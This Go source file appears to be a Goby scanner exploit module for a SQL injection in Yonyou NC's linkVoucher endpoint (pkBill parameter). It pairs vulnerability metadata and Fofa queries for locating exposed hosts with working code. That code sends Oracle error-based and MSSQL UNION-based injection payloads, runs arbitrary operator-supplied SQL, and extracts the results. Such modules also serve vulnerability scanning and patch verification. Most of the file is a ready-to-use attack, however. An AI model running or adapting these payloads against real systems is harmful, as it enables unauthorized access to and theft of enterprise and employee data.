package exploits

import (
    "errors"
    "fmt"
    "net/url"
    "regexp"
    "strings"

    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
)

func init() {
    expJson := `{
    "Name": "yongyou NC /portal/pt/yercommon/linkVoucher SQL Injection Vulnerability",
    "Description": "<p>Yongyou NC is a commercial-grade enterprise resource planning platform that provides enterprises with comprehensive management solutions, including financial management, procurement management, sales management, human resources management and other functions, to achieve digital transformation and business process optimization of enterprises.</p><p>There is a SQL injection vulnerability in the pkBill parameter of Yongyou NC system interface /portal/pt/yercommon/linkVoucher. Attackers can enter malicious SQL code to break through the access rules originally set by the system and access, modify or delete various sensitive information in the database without authorization, including but not limited to employee personal information, enterprise core business data, etc. This may not only lead to large-scale leakage of internal information within the enterprise and affect the normal operation of business processes, but may even lead to a series of serious consequences such as system crashes and malicious elevation of privileges.</p>",
    "Product": "yonyou-UFIDA-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-05-28",
    "PostTime": "2024-05-28",
    "Author": "csulhaihai@gmail.com",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\\\\\"nc_text\\\\\\\">\" || body=\"<div id=\\\\\\\"nc_img\\\\\\\" onmouseover=\\\\\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || (body=\"/Client/Uclient/UClient.exe\" && title==\"Yonyou UAP\" )",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\\\\\"nc_text\\\\\\\">\" || body=\"<div id=\\\\\\\"nc_img\\\\\\\" onmouseover=\\\\\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || (body=\"/Client/Uclient/UClient.exe\" && title==\"Yonyou UAP\" )",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in the pkBill parameter of Yongyou NC system interface /portal/pt/yercommon/linkVoucher. Attackers can enter malicious SQL code to break through the access rules originally set by the system and access, modify or delete various sensitive information in the database without authorization, including but not limited to employee personal information, enterprise core business data, etc. This may not only lead to large-scale leakage of internal information within the enterprise and affect the normal operation of business processes, but may even lead to a series of serious consequences such as system crashes and malicious elevation of privileges.</p>",
    "Recommendation": "<p>The official website has released a repair patch. Please apply the repair patch or update the system in time：<a href=\"https://security.yonyou.com/#/noticeInfo?id=555\">https://security.yonyou.com/#/noticeInfo?id=555</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "user,host,version,SQL",
            "show": ""
        },
        {
            "name": "SQL",
            "type": "input",
            "value": "SELECT SYSTEM_USER 或者 SELECT SUBSTRC((NVL(CAST(USER AS VARCHAR(4000)),CHR(32))),1,1024) FROM DUAL",
            "show": "attackType=SQL"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.1",
    "Translation": {
        "CN": {
            "Name": "用友 NC /portal/pt/yercommon/linkVoucher SQL 注入漏洞",
            "Product": "用友-UFIDA-NC",
            "Description": "<p>用友 NC 是一种商业级的企业资源规划平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，实现企业的数字化转型和业务流程优化。<br></p><p>用友 NC 系统接口 /portal/pt/yercommon/linkVoucher 的 pkBill 参数存在SQL注入漏洞。攻击者可通过输入恶意 SQL 代码，突破系统原本设定的访问规则，未经授权访问、修改或删除数据库中的各类敏感信息，包括但不限于员工个人资料、企业核心业务数据等。这不仅可能导致企业内部信息大面积泄露，影响业务流程的正常运转，甚至可能引发系统崩溃、权限被恶意提升等一系列严重后果。<br></p>",
            "Recommendation": "<p>官方已经发布修复补丁， 请及时打修复补丁或更新系统：<a href=\"https://security.yonyou.com/#/noticeInfo?id=555\" target=\"_blank\">https://security.yonyou.com/#/noticeInfo?id=555</a><br></p>",
            "Impact": "<p>用友 NC 系统接口 /portal/pt/yercommon/linkVoucher 的 pkBill 参数存在SQL注入漏洞。攻击者可通过输入恶意 SQL 代码，突破系统原本设定的访问规则，未经授权访问、修改或删除数据库中的各类敏感信息，包括但不限于员工个人资料、企业核心业务数据等。这不仅可能导致企业内部信息大面积泄露，影响业务流程的正常运转，甚至可能引发系统崩溃、权限被恶意提升等一系列严重后果。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "yongyou NC /portal/pt/yercommon/linkVoucher SQL Injection Vulnerability",
            "Product": "yonyou-UFIDA-NC",
            "Description": "<p>Yongyou NC is a commercial-grade enterprise resource planning platform that provides enterprises with comprehensive management solutions, including financial management, procurement management, sales management, human resources management and other functions, to achieve digital transformation and business process optimization of enterprises.<br></p><p>There is a SQL injection vulnerability in the pkBill parameter of Yongyou NC system interface /portal/pt/yercommon/linkVoucher. Attackers can enter malicious SQL code to break through the access rules originally set by the system and access, modify or delete various sensitive information in the database without authorization, including but not limited to employee personal information, enterprise core business data, etc. This may not only lead to large-scale leakage of internal information within the enterprise and affect the normal operation of business processes, but may even lead to a series of serious consequences such as system crashes and malicious elevation of privileges.<br></p>",
            "Recommendation": "<p>The official website has released a repair patch. Please apply the repair patch or update the system in time：<a href=\"https://security.yonyou.com/#/noticeInfo?id=555\" target=\"_blank\">https://security.yonyou.com/#/noticeInfo?id=555</a></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the pkBill parameter of&nbsp;Yongyou&nbsp;NC system interface /portal/pt/yercommon/linkVoucher. Attackers can enter malicious SQL code to break through the access rules originally set by the system and access, modify or delete various sensitive information in the database without authorization, including but not limited to employee personal information, enterprise core business data, etc. This may not only lead to large-scale leakage of internal information within the enterprise and affect the normal operation of business processes, but may even lead to a series of serious consequences such as system crashes and malicious elevation of privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10956"
}`
    makeRegularsjiu845 := func(RegularContent string, RegularUrl string) (string, error) {
        reRequestsjdsdw58 := regexp.MustCompile(RegularUrl)
        if !reRequestsjdsdw58.MatchString(RegularContent) {
            return "", fmt.Errorf("can't match value")
        }
        getname := reRequestsjdsdw58.FindStringSubmatch(RegularContent)
        return getname[1], nil
    }

    sendPayloadadasdfasOracle := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
        executeSql := ""
        if sql == "user" {
            executeSql = "SELECT+SUBSTRC((NVL(CAST(USER+AS+VARCHAR(4000)),CHR(32))),1,1024)+FROM+DUAL"
        } else if sql == "host" {
            executeSql = "SELECT+SUBSTRC((NVL(CAST(UTL_INADDR.GET_HOST_NAME+AS+VARCHAR(4000)),CHR(32))),1,1024)+FROM+DUAL"
        } else if sql == "version" {
            executeSql = "SELECT+SUBSTRC((NVL(CAST(banner+AS+VARCHAR(4000)),CHR(32))),1,256)+FROM+v$version+WHERE+ROWNUM%3d1"
        } else {
            executeSql = url.QueryEscape(sql)
        }
        uri := `/portal/pt/yercommon/linkVoucher` + `?pageId=login&pkBill=1%27%29%20AND%206818%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28` + executeSql + `%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29--%20ZmcM`
        cfg := httpclient.NewGetRequestConfig(uri)
        cfg.VerifyTls = false
        cfg.Timeout = 15

        resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
        if err != nil {
            return nil, err
        }
        if resp.StatusCode != 200 {
            return nil, errors.New("not response 200")
        }
        if !strings.Contains(resp.Utf8Html, "src_relationid") || !strings.Contains(resp.Utf8Html, "qkvbq") {
            return nil, errors.New("not info")
        }
        return resp, err

    }

    sendPayloadadasdfasMssql := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
        executeSql := ""
        if sql == "user" {
            executeSql = "SELECT+SYSTEM_USER"
        } else if sql == "host" {
            executeSql = "SELECT+@@SERVERNAME"
        } else if sql == "version" {
            executeSql = "SELECT+@@version"
        } else {
            executeSql = url.QueryEscape(sql)
        }
        uri := `/portal/pt/yercommon/linkVoucher` + `?pageId=login&pkBill=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%2BISNULL%28CAST%28(` + executeSql + `)%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28113%29%2CNULL--%20kugG`
        cfg := httpclient.NewGetRequestConfig(uri)
        cfg.VerifyTls = false
        cfg.Timeout = 15

        resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
        if err != nil {
            return nil, err
        }
        if resp.StatusCode != 200 {
            return nil, errors.New("not response 200")
        }
        if !strings.Contains(resp.Utf8Html, "fip_operatinglog") || !strings.Contains(resp.Utf8Html, "qkvbq") {
            return nil, errors.New("not info")
        }
        return resp, err

    }

    sendPayloadadasdfas := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
        resp, err := sendPayloadadasdfasOracle(hostInfo, sql)
        if err == nil {
            return resp, err
        }
        resp, err = sendPayloadadasdfasMssql(hostInfo, sql)
        if err == nil {
            return resp, err
        }
        return nil, errors.New("not vul")
    }

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
            // 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
            // PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
            // SQLite : 用database_list查询数据库名，用||拼接字符
            // SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
            // Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
            sql := `user`
            _, err := sendPayloadadasdfas(hostInfo, sql)
            if err != nil {
                return false
            }
            // 拼接SQL注入数据包的请求路径即可
            ss.VulURL = hostInfo.FixedHostInfo + `/portal/pt/yercommon/linkVoucher`
            return true
        },
        func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
            attackType := goutils.B2S(stepLogs.Params["attackType"])
            executeSql := ""
            if attackType == "SQL" {
                sql := goutils.B2S(stepLogs.Params["SQL"])
                executeSql = sql
            } else if attackType == "user" {
                executeSql = "user"
            } else if attackType == "host" {
                executeSql = "host"
            } else if attackType == "version" {
                executeSql = "version"
            } else {
                expResult.Output = `错误选项`
                expResult.Success = false
                return expResult
            }
            resp, err := sendPayloadadasdfas(expResult.HostInfo, executeSql)
            if err != nil {
                expResult.Output = `漏洞利用失败:` + err.Error()
                expResult.Success = false
                return expResult
            }
            respResult, err := makeRegularsjiu845(resp.Utf8Html, `qkvbq([^"]+)qbpjq`)
            if err != nil {
                expResult.Output = `漏洞利用失败:` + err.Error()
                expResult.Success = false
                return expResult
            }
            expResult.Output = respResult
            expResult.Success = true
            return expResult
        },
    ))
}
